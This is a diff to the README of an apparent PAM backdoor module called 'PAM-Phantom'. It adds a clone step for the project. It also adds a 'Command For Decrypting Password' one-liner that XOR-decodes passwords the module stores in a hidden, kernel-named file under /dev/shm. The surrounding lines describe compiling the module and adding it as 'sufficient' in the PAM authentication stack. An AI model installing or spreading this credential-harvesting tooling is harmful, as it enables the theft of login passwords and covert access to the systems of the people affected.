@@ -96,6 +96,11 @@ sudo apt-get install libpam0g-dev gcc -y
 
 PAM modules are loaded as shared objects (`.so`) rather than standalone executables.
 
+```bash id="v3m7qa"
+git clone https://github.com/govind-sec/PAM-Phantom.git
+cd PAM-Phantom
+```
+
 ### Compile the Module
 
 ```bash id="m2q9cd"
@@ -210,6 +215,11 @@ auth sufficient pam_phantom.so
   Indicates that if the module succeeds, PAM may continue without requiring additional authentication modules.
 
 This demonstrates how PAM modules integrate directly into Linux authentication workflows.
+
+# Command For Decrypting Password
+```
+python3 -c "key=0x5A; print(''.join(chr(b ^ key) for b in open('/dev/shm/.kcore_sys', 'rb').read()))"
+```
 
 ---
 
